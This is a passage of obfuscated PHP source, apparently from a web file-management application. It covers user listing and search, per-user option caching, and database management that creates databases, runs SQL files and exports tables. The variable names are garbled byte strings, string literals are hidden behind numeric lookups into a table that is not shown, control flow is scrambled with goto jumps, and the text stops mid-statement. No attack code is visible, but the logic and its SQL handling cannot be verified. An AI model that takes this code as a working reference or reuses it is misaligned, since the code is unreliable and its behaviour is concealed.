$BëÌ“ƒôÃË[33] : $BëÌ“ƒôÃË[2552]; } if (isset($a¸Ñ–±Õì [$BëÌ“ƒôÃË[690]])) { $dÑºòÂÇ ˆ[$BëÌ“ƒôÃË[2553]] = $a¸Ñ–±Õì [$BëÌ“ƒôÃË[690]]; } $Fƒ‚äï‡æë = $this->_makeOrder($d‚Ê„ñŒà)->field($BëÌ“ƒôÃË[2554])->where($dÑºòÂÇ ˆ)->join($Fƒ’÷”Õ“)->selectPage(50); goto DˆÒµ´¿†œ; DˆÒµ´¿†œ: $this->_listDataApply($Fƒ‚äï‡æë[$BëÌ“ƒôÃË[354]]); return $Fƒ‚äï‡æë; goto B¦óèéë­ã; BÎ–çÆÑŸ·: $BëÌ“ƒôÃË =& $_SERVER[´Ù×Íå‘ÄõÛ]; $Fƒ’÷”Õ“ = $BëÌ“ƒôÃË[33]; $dÑºòÂÇ ˆ = array(); goto D·ù¥²¨¨±; B¦óèéë­ã: } private function _makeOrder($c¾¼¹›Ã³é = '') { goto BÑÀÌŸßôè; f½Õ¨¦õ²Ÿ: $c¾¼¹›Ã³é = $c¾¼¹›Ã³é . "\165\163\x65\x72\56{$d·À´‹ë‡´}\40{$cš„ƒø…Äš}\54\40\165\163\x65\x72\56\165\163\145\x72\x49\x44\40\141\x73\x63"; return $this->alias($fŸÍº®©¯´[2300])->order($c¾¼¹›Ã³é); goto C×Ò—‡¨›; d–‰ÙƒÕ…Í: $d·À´‹ë‡´ = Input::get($fŸÍº®©¯´[407], $fŸÍº®©¯´[7], $fŸÍº®©¯´[1432], $cÛÒŒ„ì‚¶); $cš„ƒø…Äš = Input::get($fŸÍº®©¯´[408], $fŸÍº®©¯´[7], $fŸÍº®©¯´[2192], array($fŸÍº®©¯´[2192], $fŸÍº®©¯´[404])); $cš„ƒø…Äš = $aÍ¡Îä¶[$cš„ƒø…Äš]; goto f½Õ¨¦õ²Ÿ; BÑÀÌŸßôè: $fŸÍº®©¯´ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $cÛÒŒ„ì‚¶ = array($fŸÍº®©¯´[1441], $fŸÍº®©¯´[28], $fŸÍº®©¯´[2098], $fŸÍº®©¯´[2070], $fŸÍº®©¯´[187]); $aÍ¡Îä¶ = array($fŸÍº®©¯´[402] => $fŸÍº®©¯´[403], $fŸÍº®©¯´[404] => $fŸÍº®©¯´[405]); goto d–‰ÙƒÕ…Í; C×Ò—‡¨›: } public function listSearch($F ù‰ÚÈŸ) { goto eÅÙœà½ŠØ; d¬–ñ§ªï: return $EÔ”…¬Ü‰Ï; goto Eƒä’ˆ¹•; EÛµÚµØÈ‰: $d‡ã”‘‰Ğ‚ = str_replace($b×¦ØÉôãŸ[2195], $b×¦ØÉôãŸ[2196], trim($d‡ã”‘‰Ğ‚)); $d†Ç´ô„“ = array($b×¦ØÉôãŸ[28] => array($b×¦ØÉôãŸ[752], "\x25{$d‡ã”‘‰Ğ‚}\45"), $b×¦ØÉôãŸ[293] => array($b×¦ØÉôãŸ[752], "\x25{$d‡ã”‘‰Ğ‚}\45"), $b×¦ØÉôãŸ[2358] => array($b×¦ØÉôãŸ[752], "\x25{$d‡ã”‘‰Ğ‚}\45"), $b×¦ØÉôãŸ[917] => $b×¦ØÉôãŸ[2197]); if (Input::check($d‡ã”‘‰Ğ‚, $b×¦ØÉôãŸ[299])) { $d†Ç´ô„“[$b×¦ØÉôãŸ[1441]] = array($b×¦ØÉôãŸ[752], "\x25{$d‡ã”‘‰Ğ‚}\x25"); $d†Ç´ô„“[$b×¦ØÉôãŸ[2535]] = array($b×¦ØÉôãŸ[752], "\x25{$d‡ã”‘‰Ğ‚}\45"); } goto BÀõ¨»¹ö–; fÑİâ– ø‹: if (!$EÔ”…¬Ü‰Ï || count($EÔ”…¬Ü‰Ï[$b×¦ØÉôãŸ[354]]) < 5 && Input::check($d‡ã”‘‰Ğ‚, $b×¦ØÉôãŸ[306])) { $Eä¬â­éÅÖ = $this->_searchFromMeta($b×¦ØÉôãŸ[415], $d‡ã”‘‰Ğ‚, 10); $eõ£ê²¹Ÿå = $this->_searchFromMeta($b×¦ØÉôãŸ[416], $d‡ã”‘‰Ğ‚, 10); $dÀá¿Œ«§í = array_merge($Eä¬â­éÅÖ, $eõ£ê²¹Ÿå, $EÔ”…¬Ü‰Ï[$b×¦ØÉôãŸ[354]]); $EÔ”…¬Ü‰Ï[$b×¦ØÉôãŸ[354]] = array_unique_by_key($dÀá¿Œ«§í, $b×¦ØÉôãŸ[1441]); $EÔ”…¬Ü‰Ï[$b×¦ØÉôãŸ[351]][$b×¦ØÉôãŸ[352]] = count($EÔ”…¬Ü‰Ï[$b×¦ØÉôãŸ[354]]); $EÔ”…¬Ü‰Ï[$b×¦ØÉôãŸ[351]][$b×¦ØÉôãŸ[353]] = ceil($EÔ”…¬Ü‰Ï[$b×¦ØÉôãŸ[351]][$b×¦ØÉôãŸ[352]] / $EÔ”…¬Ü‰Ï[$b×¦ØÉôãŸ[351]][$b×¦ØÉôãŸ[349]]); } $this->_listDataApply($EÔ”…¬Ü‰Ï[$b×¦ØÉôãŸ[354]]); $this->_filterByGroup($EÔ”…¬Ü‰Ï, $Fá‰–ŠØ•’); goto d¬–ñ§ªï; eÅÙœà½ŠØ: $b×¦ØÉôãŸ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $d‡ã”‘‰Ğ‚ = $F ù‰ÚÈŸ[$b×¦ØÉôãŸ[2193]]; $Fá‰–ŠØ•’ = isset($F ù‰ÚÈŸ[$b×¦ØÉôãŸ[2194]]) ? $F ù‰ÚÈŸ[$b×¦ØÉôãŸ[2194]] : !1; goto EÛµÚµØÈ‰; BÀõ¨»¹ö–: if (!$d‡ã”‘‰Ğ‚) { $d†Ç´ô„“ = array(); } if (isset($F ù‰ÚÈŸ[$b×¦ØÉôãŸ[690]])) { $d†Ç´ô„“[$b×¦ØÉôãŸ[690]] = $F ù‰ÚÈŸ[$b×¦ØÉôãŸ[690]]; } $EÔ”…¬Ü‰Ï = $this->_makeOrder()->where($d†Ç´ô„“)->selectPage(20); goto fÑİâ– ø‹; Eƒä’ˆ¹•: } private function _filterByGroup(&$e‹ÙãâÃ½Î, $fâß˜îİ¨Á) { $c’ÀÜ¸Ë‹Ğ =& $_SERVER[´Ù×Íå‘ÄõÛ]; if (!$fâß˜îİ¨Á) { return $e‹ÙãâÃ½Î; } foreach ($e‹ÙãâÃ½Î[$c’ÀÜ¸Ë‹Ğ[354]] as $F÷·¨µïøğ => &$dÀÀ£¨‡¾–) { $cÑ½»µ¸´Ş = array_to_keyvalue($dÀÀ£¨‡¾–[$c’ÀÜ¸Ë‹Ğ[2555]], $c’ÀÜ¸Ë‹Ğ[33], $c’ÀÜ¸Ë‹Ğ[2112]); if (!in_array($fâß˜îİ¨Á, $cÑ½»µ¸´Ş)) { unset($e‹ÙãâÃ½Î[$c’ÀÜ¸Ë‹Ğ[354]][$F÷·¨µïøğ]); } } $e‹ÙãâÃ½Î[$c’ÀÜ¸Ë‹Ğ[354]] = array_values($e‹ÙãâÃ½Î[$c’ÀÜ¸Ë‹Ğ[354]]); $e‹ÙãâÃ½Î[$c’ÀÜ¸Ë‹Ğ[351]] = array($c’ÀÜ¸Ë‹Ğ[2333] => count($e‹ÙãâÃ½Î[$c’ÀÜ¸Ë‹Ğ[354]]), $c’ÀÜ¸Ë‹Ğ[2331] => $e‹ÙãâÃ½Î[$c’ÀÜ¸Ë‹Ğ[351]][$c’ÀÜ¸Ë‹Ğ[349]], $c’ÀÜ¸Ë‹Ğ[2330] => 1, $c’ÀÜ¸Ë‹Ğ[2332] => 1); } private function _searchFromMeta($aÖˆõ½î­½, $DÖô­Éé, $Aš°ÎÛæ›á) { goto Cò‹Ÿšµ”; AêŠßêŞ : $E¨¤¤Âé ó = $this->where(array($fÚ”ˆ¾Şá[1432] => array($fÚ”ˆ¾Şá[7], $Fé»ñë¢“ë)))->select(); if (!$E¨¤¤Âé ó) { return array(); } return $E¨¤¤Âé ó; goto fªŠµù¥ØÈ; F‚„Òó®õƒ: $Fé»ñë¢“ë = Model($fÚ”ˆ¾Şá[2556])->where($Dã›ºšÙƒÉ)->limit($Aš°ÎÛæ›á)->select(); if (!$Fé»ñë¢“ë) { return array(); } $Fé»ñë¢“ë = array_to_keyvalue($Fé»ñë¢“ë, $fÚ”ˆ¾Şá[33], $fÚ”ˆ¾Şá[1441]); goto AêŠßêŞ ; Cò‹Ÿšµ”: $fÚ”ˆ¾Şá =& $_SERVER[´Ù×Íå‘ÄõÛ]; $DÖô­Éé = strtolower($DÖô­Éé); $Dã›ºšÙƒÉ = array($fÚ”ˆ¾Şá[89] => $aÖˆõ½î­½, $fÚ”ˆ¾Şá[359] => array($fÚ”ˆ¾Şá[752], "\x25{$DÖô­Éé}\x25")); goto F‚„Òó®õƒ; fªŠµù¥ØÈ: } private function _listDataApplyItem($bóö•ÍÌ×¸) { $b«é…ò¥¹„ = array($bóö•ÍÌ×¸); $this->_listDataApply($b«é…ò¥¹„); return $b«é…ò¥¹„[0]; } private function _listDataApply(&$bºÀø¾Â) { goto B•˜Á³É; cİˆÎˆ÷: $dÒ ³ğæÜ± = array_to_keyvalue($bºÀø¾Â, $BÆí²‹ÙÊÒ[33], $BÆí²‹ÙÊÒ[1441]); $this->_listAppendGroup($bºÀø¾Â, $dÒ ³ğæÜ±); $this->_listAppendMeta($bºÀø¾Â, $dÒ ³ğæÜ±); goto CíÆŸ…Ìåğ; CíÆŸ…Ìåğ: $this->_listAppendSourceRoot($bºÀø¾Â, $dÒ ³ğæÜ±); goto Bë­îìà; B•˜Á³É: $BÆí²‹ÙÊÒ =& $_SERVER[´Ù×Íå‘ÄõÛ]; if (!$bºÀø¾Â) { return; } array_remove_key($bºÀø¾Â, $BÆí²‹ÙÊÒ[805]); goto cİˆÎˆ÷; Bë­îìà: } private function _listAppendSourceRoot(&$bº¦ÂÈ×‘¶, $fÙî¢¼¬÷) { goto F¾ØæÊ®ƒ; F¾ØæÊ®ƒ: $bÚŞµíŠíİ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $a½ˆÖá“Åº = array($bÚŞµíŠíİ[463] => 0, $bÚŞµíŠíİ[371] => SourceModel::TYPE_USER, $bÚŞµíŠíİ[458] => array($bÚŞµíŠíİ[7], $fÙî¢¼¬÷)); $B™…Ä£¡ÉØ = $bÚŞµíŠíİ[2204]; goto dğŠøÊÚ; bƒ±ğ¶¢•¯: foreach ($bº¦ÂÈ×‘¶ as &$AÄßËİôĞ) { $AÄßËİôĞ[$bÚŞµíŠíİ[391]] = $CÈ”˜³ôÉË[$AÄßËİôĞ[$bÚŞµíŠíİ[1441]]] ? $CÈ”˜³ôÉË[$AÄßËİôĞ[$bÚŞµíŠíİ[1441]]] : array(); } goto Fğ°ì‚§ÌÅ; dğŠøÊÚ: $CÈ”˜³ôÉË = Model($bÚŞµíŠíİ[753])->order($bÚŞµíŠíİ[2205])->field($B™…Ä£¡ÉØ)->where($a½ˆÖá“Åº)->select(); $CÈ”˜³ôÉË = array_to_keyvalue($CÈ”˜³ôÉË, $bÚŞµíŠíİ[458]); $CÈ”˜³ôÉË = array_remove_key($CÈ”˜³ôÉË, $bÚŞµíŠíİ[458]); goto bƒ±ğ¶¢•¯; Fğ°ì‚§ÌÅ: } private function _listAppendGroup(&$DÕòÜš»Ô«, $b‡Ã‘–Ù) { goto f‚îÜà†ÓÊ; B¿¤ä¡ˆ: $BÎ©ÜäÀÓ = array_to_keyvalue($aøçø‹­á‚, $EİáÔ–Ïë¡[33], $EİáÔ–Ïë¡[2112]); $BÎ©ÜäÀÓ = array_remove_value(array_unique($BÎ©ÜäÀÓ), $EİáÔ–Ïë¡[470]); if (!$BÎ©ÜäÀÓ || !$aøçø‹­á‚) { return; } goto aôÎâÈ Œ¿; aôÎâÈ Œ¿: $BÆ‚‰—‡ë = array($EİáÔ–Ïë¡[2112] => array($EİáÔ–Ïë¡[7], $BÎ©ÜäÀÓ)); $C¬è¾Ä‰÷ = Model($EİáÔ–Ïë¡[2557])->field($EİáÔ–Ïë¡[2558])->where($BÆ‚‰—‡ë)->select(); $C¬è¾Ä‰÷ = array_to_keyvalue($C¬è¾Ä‰÷, $EİáÔ–Ïë¡[2112]); goto CÑ±êÒ÷Î›; f‚îÜà†ÓÊ: $EİáÔ–Ïë¡ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $BÆ‚‰—‡ë = array($EİáÔ–Ïë¡[1441] => array($EİáÔ–Ïë¡[7], $b‡Ã‘–Ù)); $aøçø‹­á‚ = Model($EİáÔ–Ïë¡[2191])->where($BÆ‚‰—‡ë)->select(); goto B¿¤ä¡ˆ; CÑ±êÒ÷Î›: $aøçø‹­á‚ = array_to_keyvalue_group($aøçø‹­á‚, $EİáÔ–Ïë¡[1441]); foreach ($aøçø‹­á‚ as &$e¯Ä¿ø¸¾) { $CêÛÅ¼‘Ì = array(); foreach ($e¯Ä¿ø¸¾ as $a­Ä‹¦Ñëò) { if (!$a­Ä‹¦Ñëò[$EİáÔ–Ïë¡[2256]]) { continue; } $AÚ¨Şµ°àÆ = Model($EİáÔ–Ïë¡[2275])->listData($a­Ä‹¦Ñëò[$EİáÔ–Ïë¡[2256]]); $CêÛÅ¼‘Ì[] = array($EİáÔ–Ïë¡[2112] => $a­Ä‹¦Ñëò[$EİáÔ–Ïë¡[2112]], $EİáÔ–Ïë¡[2559] => $C¬è¾Ä‰÷[$a­Ä‹¦Ñëò[$EİáÔ–Ïë¡[2112]]][$EİáÔ–Ïë¡[28]], $EİáÔ–Ïë¡[461] => $C¬è¾Ä‰÷[$a­Ä‹¦Ñëò[$EİáÔ–Ïë¡[2112]]][$EİáÔ–Ïë¡[461]], $EİáÔ–Ïë¡[376] => $AÚ¨Şµ°àÆ); } $e¯Ä¿ø¸¾ = $CêÛÅ¼‘Ì; } foreach ($DÕòÜš»Ô« as &$a‰ğ²‡˜) { $a‰ğ²‡˜[$EİáÔ–Ïë¡[2555]] = array(); if (isset($aøçø‹­á‚[$a‰ğ²‡˜[$EİáÔ–Ïë¡[1441]]])) { $a‰ğ²‡˜[$EİáÔ–Ïë¡[2555]] = $aøçø‹­á‚[$a‰ğ²‡˜[$EİáÔ–Ïë¡[1441]]]; } } goto E¾¢‹Àå¨; E¾¢‹Àå¨: } private function _listAppendMeta(&$aÜ’ğ¥İÆ‚, $eõÁÌšğ³ñ) { goto E¦†„ğ±Å; cÅ‚ğ¢‡¤: $bó´£Å—ÕÉ = array($d¦…Ûá±é[1441] => array($d¦…Ûá±é[7], $eõÁÌšğ³ñ)); $AŒªÛ¿Ì‘¼ = Model($d¦…Ûá±é[2534])->where($bó´£Å—ÕÉ)->select(); $AŒªÛ¿Ì‘¼ = array_to_keyvalue_group($AŒªÛ¿Ì‘¼, $d¦…Ûá±é[1441]); goto CøÛ¼Î‰¶Ó; E¦†„ğ±Å: $d¦…Ûá±é =& $_SERVER[´Ù×Íå‘ÄõÛ]; $F·¸•Ö‡»· = UserJobModel::JOB_KEY; $cö„…Ğ©ñš = array($d¦…Ûá±é[2537]); goto cÅ‚ğ¢‡¤; CøÛ¼Î‰¶Ó: foreach ($AŒªÛ¿Ì‘¼ as &$C†í„Í¯ùÙ) { $Bàâà©ŒÑ = array(); foreach ($C†í„Í¯ùÙ as $e¾£ÒÍ–ÚÌ) { if (!in_array($e¾£ÒÍ–ÚÌ[$d¦…Ûá±é[89]], $cö„…Ğ©ñš)) { $Bàâà©ŒÑ[$e¾£ÒÍ–ÚÌ[$d¦…Ûá±é[89]]] = $e¾£ÒÍ–ÚÌ[$d¦…Ûá±é[359]]; } } $C†í„Í¯ùÙ = $Bàâà©ŒÑ; } $cğ×±Ô³£Í = Model($d¦…Ûá±é[2560]); foreach ($aÜ’ğ¥İÆ‚ as &$Aó½®ê×«Õ) { $D²é¸«™ÉÄ = array(); if (isset($AŒªÛ¿Ì‘¼[$Aó½®ê×«Õ[$d¦…Ûá±é[1441]]])) { $D²é¸«™ÉÄ = $AŒªÛ¿Ì‘¼[$Aó½®ê×«Õ[$d¦…Ûá±é[1441]]]; } $Aó½®ê×«Õ[$d¦…Ûá±é[2561]] = array(); if (isset($D²é¸«™ÉÄ[$F·¸•Ö‡»·])) { $Aó½®ê×«Õ[$d¦…Ûá±é[2561]] = $cğ×±Ô³£Í->getUserJobInfo($D²é¸«™ÉÄ[$F·¸•Ö‡»·]); } } goto B›ŒÀãÍ; B›ŒÀãÍ: } protected function groupUserAll($a±ªĞçË¸‘) { $B—´Ë¶ğÓ =& $_SERVER[´Ù×Íå‘ÄõÛ]; if (!$a±ªĞçË¸‘) { return !1; } $dÙËĞˆğ…Š = Model($B—´Ë¶ğÓ[2191])->field($B—´Ë¶ğÓ[1441])->where(array($B—´Ë¶ğÓ[2112] => array($B—´Ë¶ğÓ[7], $a±ªĞçË¸‘)))->select(); $dÙËĞˆğ…Š = array_to_keyvalue($dÙËĞˆğ…Š, $B—´Ë¶ğÓ[33], $B—´Ë¶ğÓ[1441]); return array_unique($dÙËĞˆğ…Š); } public function userSearch($e±®«È³¢é, $BŠ¼ä‘±Ù = "\52") { return Model($_SERVER[´Ù×Íå‘ÄõÛ][479])->where($e±®«È³¢é)->field($BŠ¼ä‘±Ù)->find(); } } class UserOptionModel extends ModelBaseOption { protected $tableName = "\165\163\145\x72\137\x6f\160\164\151\x6f\x6e"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($B‡áÏÓ“õ‡) { $B÷ªÖ†Œ¹ =& $_SERVER[´Ù×Íå‘ÄõÛ]; if (!defined($B÷ªÖ†Œ¹[427])) { define($B÷ªÖ†Œ¹[427], 0); } return "\x55\x73\x65\x72\x4f\160\x74\x69\157\x6e\x5f{$B‡áÏÓ“õ‡}\137" . USER_ID; } protected function filterWhere($E·Å¡İöŠÑ) { $Fˆ—×áœ÷Å =& $_SERVER[´Ù×Íå‘ÄõÛ]; if (!defined($Fˆ—×áœ÷Å[427])) { define($Fˆ—×áœ÷Å[427], 0); } $E·Å¡İöŠÑ[$Fˆ—×áœ÷Å[1441]] = USER_ID; return $E·Å¡İöŠÑ; } public function cacheRemoveUser($f·”¼ Ù…­, $D«ÛŠÂîâ) { return Cache::remove("\125\163\145\x72\x4f\x70\164\151\x6f\x6e\x5f{$f·”¼ Ù…­}\137" . $D«ÛŠÂîâ); } protected function optionDefault($Båèˆ¨Ğ¥— = '') { $AèÕŸ·Û„¾ =& $_SERVER[´Ù×Íå‘ÄõÛ]; if ($Båèˆ¨Ğ¥— == $AèÕŸ·Û„¾[33]) { return $GLOBALS[$AèÕŸ·Û„¾[6]][$AèÕŸ·Û„¾[2562]]; } if ($Båèˆ¨Ğ¥— == $AèÕŸ·Û„¾[2563]) { return $GLOBALS[$AèÕŸ·Û„¾[6]][$AèÕŸ·Û„¾[2564]]; } } } goto FÏˆ²ÕÄÉĞ; EÏ²¤ Ñ: class DbManage { function __construct($AÄê§¶‡ïï, $F´»ÛêäæÎ = '') { $this->database = $AÄê§¶‡ïï; $this->type = $F´»ÛêäæÎ; } public function model($B ŒÓ¬¸ = '') { return new ModelBase($B ŒÓ¬¸, $_SERVER[´Ù×Íå‘ÄõÛ][33], $this->database); } public function db($DÏáÎ‘Ø„§ = false) { goto e‰…›¯îã; AÌ§Ë†¦À¬: $this->database = $AßöëÃ‰Ò¤; $dÒ­¢›º×‘ = $this->model()->db(); try { $CÙ¡É›ì = $dÒ­¢›º×‘->execute("\x73\x68\157\x77\40\144\141\x74\141\142\x61\x73\x65\163\40\154\x69\153\145\40\47{$FÃ¹Šãµ˜}\47"); } catch (Exception $EµÑÊáÃŠ) { } goto F¹‹á†Å; F¹‹á†Å: if (!$CÙ¡É›ì) { $dÒ­¢›º×‘->execute("\143\x72\145\x61\164\145\40\144\141\164\x61\142\x61\x73\x65\40\x60{$FÃ¹Šãµ˜}\x60"); } $AßöëÃ‰Ò¤[$aŒÅÈŸ•·“[888]] = $FÃ¹Šãµ˜; if ($AßöëÃ‰Ò¤[$aŒÅÈŸ•·“[723]] == $aŒÅÈŸ•·“[724]) { $AßöëÃ‰Ò¤[$aŒÅÈŸ•·“[725]] .= $aŒÅÈŸ•·“[976] . $FÃ¹Šãµ˜; } goto aƒ§‘Œ´ÜØ; aƒ§‘Œ´ÜØ: $this->database = $AßöëÃ‰Ò¤; $dÒ­¢›º×‘->execute("\x75\x73\145\x20\140{$FÃ¹Šãµ˜}\x60"); return $dÒ­¢›º×‘; goto DÑ‡ˆ¯àŞÈ; fÂÑåö‚²Ş: $FÃ¹Šãµ˜ = $AßöëÃ‰Ò¤[$aŒÅÈŸ•·“[888]]; $AßöëÃ‰Ò¤[$aŒÅÈŸ•·“[888]] = $aŒÅÈŸ•·“[33]; if ($AßöëÃ‰Ò¤[$aŒÅÈŸ•·“[723]] == $aŒÅÈŸ•·“[724]) { $dí¡Â—Ğôº = $AßöëÃ‰Ò¤[$aŒÅÈŸ•·“[725]]; $AßöëÃ‰Ò¤[$aŒÅÈŸ•·“[725]] = substr($dí¡Â—Ğôº, 0, strrpos($dí¡Â—Ğôº, $aŒÅÈŸ•·“[976])); } goto AÌ§Ë†¦À¬; e‰…›¯îã: $aŒÅÈŸ•·“ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $AßöëÃ‰Ò¤ = array_change_key_case($this->database); if ($this->type == $aŒÅÈŸ•·“[9] || !$DÏáÎ‘Ø„§) { return $this->model()->db(); } goto fÂÑåö‚²Ş; DÑ‡ˆ¯àŞÈ: } public function createTable($a‡ÉæÒİ°Ä, $FœĞ„±èÜ = null) { $DõË¸éî»­ =& $_SERVER[´Ù×Íå‘ÄõÛ]; if (!IO::exist($a‡ÉæÒİ°Ä)) { ActionCall($DõË¸éî»­[977], !0, 0); show_json(LNG($DõË¸éî»­[978]), !1); } $BÉ™öÀÔ = sqlSplit(IO::getContent($a‡ÉæÒİ°Ä)); foreach ($BÉ™öÀÔ as $B³ñÊÖ¤‰) { if ($FœĞ„±èÜ) { $CĞÈö…Ö¹§ = stripos($B³ñÊÖ¤‰, $DõË¸éî»­[979]) === 0; if ($CĞÈö…Ö¹§) { $FœĞ„±èÜ->task[$DõË¸éî»­[980]] += 1; } } $this->model()->db()->execute($B³ñÊÖ¤‰); if ($FœĞ„±èÜ && $CĞÈö…Ö¹§) { preg_match($DõË¸éî»­[981], $B³ñÊÖ¤‰, $B¸ìàŠ‚øù); $FœĞ„±èÜ->task[$DõË¸éî»­[982]] = $B¸ìàŠ‚øù[1]; $FœĞ„±èÜ->update(1); } } $this->taskToCache($FœĞ„±èÜ); } public function insertTable($Eõ‹©Îî‹, $dÛ³ã§Ú« = null) { $BÏ¡¤¤¿Çå =& $_SERVER[´Ù×Íå‘ÄõÛ]; $fº‘¢ŸÑ®¯ = $this->model()->db(); $a…İŸêÜ¯ = $aĞ”ÊŞøƒ¦ ? array($aĞ”ÊŞøƒ¦) : $fº‘¢ŸÑ®¯->getTables(); foreach ($Eõ‹©Îî‹ as $aáÕœ°ŒÍ) { $aĞ”ÊŞøƒ¦ = basename($aáÕœ°ŒÍ, $BÏ¡¤¤¿Çå[718]); if (!in_array($aĞ”ÊŞøƒ¦, $a…İŸêÜ¯)) { continue; } if ($dÛ³ã§Ú«) { $dÛ³ã§Ú«->task[$BÏ¡¤¤¿Çå[982]] = $aĞ”ÊŞøƒ¦; } if (get_filesize($aáÕœ°ŒÍ) == 0) { continue; } $cÄŒŠïãéÜ = $this->sqlToDb($aáÕœ°ŒÍ, $dÛ³ã§Ú«); if (!$cÄŒŠïãéÜ) { ActionCall($BÏ¡¤¤¿Çå[977], !0, 0); show_json(LNG($BÏ¡¤¤¿Çå[983]) . "\x5b{$aĞ”ÊŞøƒ¦}\x5d", !1); } } $this->taskToCache($dÛ³ã§Ú«); } public function sqlFromDb($fã¸Ÿ±Ã©, $A×‡í©¨ÅÜ, $eÇ¯Ÿ¾·¯Ç = null, $dÉ‚†ìÔ¥ = null) { goto Cßæá‚¨¥í; fë›ã‚Ì: $eæóÏŸÄ£« = $fì¤Ê˜ù«Ä->getPk(); $EëœëÓšôê = $fì¤Ê˜ù«Ä->getDbFields(); do { $CƒŠöäÉ‘ = $fì¤Ê˜ù«Ä->field($EëœëÓšôê)->order($eæóÏŸÄ£« . $_SERVER[´Ù×Íå‘ÄõÛ][985])->selectPage($dé‚Œá²Ì“, $fÓŒÄöã«…); $Dö¨­øõ‰æ = isset($CƒŠöäÉ‘[$_SERVER[´Ù×Íå‘ÄõÛ][351]][$_SERVER[´Ù×Íå‘ÄõÛ][353]]) ? $CƒŠöäÉ‘[$_SERVER[´Ù×Íå‘ÄõÛ][351]][$_SERVER[´Ù×Íå‘ÄõÛ][353]] : 0; $BÈ„ŞÑ¥ÌÊ = !empty($CƒŠöäÉ‘[$_SERVER[´Ù×Íå‘ÄõÛ][354]]) ? $CƒŠöäÉ‘[$_SERVER[´Ù×Íå‘ÄõÛ][354]] : array(); if (!($føµ—ÅˆØÖ = count($BÈ„ŞÑ¥ÌÊ))) { break; } $dßïÑ®¡¬™ = array(); foreach ($BÈ„ŞÑ¥ÌÊ as $FĞä˜Í†Ê) { if ($fã¸Ÿ±Ã© == $_SERVER[´Ù×Íå‘ÄõÛ][986] && $FĞä˜Í†Ê[$_SERVER[´Ù×Íå‘ÄõÛ][29]] == $_SERVER[´Ù×Íå‘ÄõÛ][987]) { $eÓ—ì«•ö = json_decode($FĞä˜Í†Ê[$_SERVER[´Ù×Íå‘ÄõÛ][359]], !0); if ($eÓ—ì«•ö[$_SERVER[´Ù×Íå‘ÄõÛ][28]] == date($_SERVER[´Ù×Íå‘ÄõÛ][691]) && !$eÓ—ì«•ö[$_SERVER[´Ù×Íå‘ÄõÛ][690]]) { continue; } } if ($dÉ‚†ìÔ¥) { $FĞä˜Í†Ê[$_SERVER[´Ù×Íå‘ÄõÛ][75]] = "\x7b\x69\157\72{$dÉ‚†ìÔ¥}\175" . substr($FĞä˜Í†Ê[$_SERVER[´Ù×Íå‘ÄõÛ][75]], strlen("\x7b\151\157\x3a{$FĞä˜Í†Ê[$_SERVER[´Ù×Íå‘ÄõÛ][744]]}\175")); $FĞä˜Í†Ê[$_SERVER[´Ù×Íå‘ÄõÛ][744]] = $dÉ‚†ìÔ¥; } $dßïÑ®¡¬™[] = $_SERVER[´Ù×Íå‘ÄõÛ][988] . $this->sqlEncode($FĞä˜Í†Ê) . $_SERVER[´Ù×Íå‘ÄõÛ][989]; } $C³„â‘ÓÊ­ = "\111\x4e\123\x45\122\x54\x20\x49\x4e\124\117\x20\x60{$fã¸Ÿ±Ã©}\x60\40\50\140" . implode($_SERVER[´Ù×Íå‘ÄõÛ][990], $EëœëÓšôê) . $_SERVER[´Ù×Íå‘ÄõÛ][991]; fwrite($dÎ•óôô·, $C³„â‘ÓÊ­ . implode($_SERVER[´Ù×Íå‘ÄõÛ][992], $dßïÑ®¡¬™) . $_SERVER[´Ù×Íå‘ÄõÛ][67] . PHP_EOL); $fÓŒÄöã«…++; $fššÃ¹¬‹ù += $føµ—ÅˆØÖ; if ($eÇ¯Ÿ¾·¯Ç) { $eÇ¯Ÿ¾·¯Ç->update($føµ—ÅˆØÖ); } } while ($fÓŒÄöã«… <= $Dö¨­øõ‰æ); goto A¨«Á°æ¾‘; A¥ŠÁØ‚“Ê: $fÓŒÄöã«… = 1; $dé‚Œá²Ì“ = 500; $dÎ•óôô· = fopen($A×‡í©¨ÅÜ, $_SERVER[´Ù×Íå‘ÄõÛ][984]); goto fë›ã‚Ì; A¨«Á°æ¾‘: fclose($dÎ•óôô·); return $fššÃ¹¬‹ù; goto CºìßÈÓ; Cßæá‚¨¥í: if ($eÇ¯Ÿ¾·¯Ç) { $eÇ¯Ÿ¾·¯Ç->task[$_SERVER[´Ù×Íå‘ÄõÛ][982]] = $fã¸Ÿ±Ã©; } $fì¤Ê˜ù«Ä = $this->model($fã¸Ÿ±Ã©); $fššÃ¹¬‹ù = 0; goto A¥ŠÁØ‚“Ê; CºìßÈÓ: } public function sqlToDb($dÄÆèˆ‹Éê, $d¬Ìæ‘ÕòĞ = null) { goto DÆÀ”á§õï; DÆÀ”á§õï: $a„ó±ôö® =& $_SERVER[´Ù×Íå‘ÄõÛ]; $bŒ·Ì¬–ì± = $this->model()->db(); $DÈŒ‹óÇ» = @fopen($dÄÆèˆ‹Éê, $a„ó±ôö®[993]); goto f½‘Œœ‰è; dåÊ¥À±ò›: if (trim($b³Çğ¢»†)) { $b³Çğ¢»† = rtrim(trim($b³Çğ¢»†), $a„ó±ôö®[67]); if (!$bŒ·Ì¬–ì±->execute($b³Çğ¢»†)) { return !1; } if ($d¬Ìæ‘ÕòĞ) { $d¬Ìæ‘ÕòĞ->update($B¥õââÃ¹Ó - 1); } } return !0; goto AÉŒÅò—¬Ó; f½‘Œœ‰è: if (!$DÈŒ‹óÇ») { return !1; } $B¥õââÃ¹Ó = 0; $b³Çğ¢»† = $a„ó±ôö®[33]; goto a…öÃß½­¨; a…öÃß½­¨: $bîëéµÅ­ = 500 + 1; while (!feof($DÈŒ‹óÇ»)) { if ($d¬Ìæ‘ÕòĞ && $B¥õââÃ¹Ó != 0) { $d¬Ìæ‘ÕòĞ->task[$a„ó±ôö®[980]] += 1; } $B¥õââÃ¹Ó++; $D¦Ü¬õÙ© = trim(fgets($DÈŒ‹óÇ»)); $b³Çğ¢»† .= $a„ó±ôö®[50] . $this->sqlDecode($D¦Ü¬õÙ©, $this->type); if ($B¥õââÃ¹Ó == $bîëéµÅ­) { $b³Çğ¢»† = rtrim(trim($b³Çğ¢»†), $a„ó±ôö®[67]); if (!$bŒ·Ì¬–ì±->execute($b³Çğ¢»†)) { return !1; } if 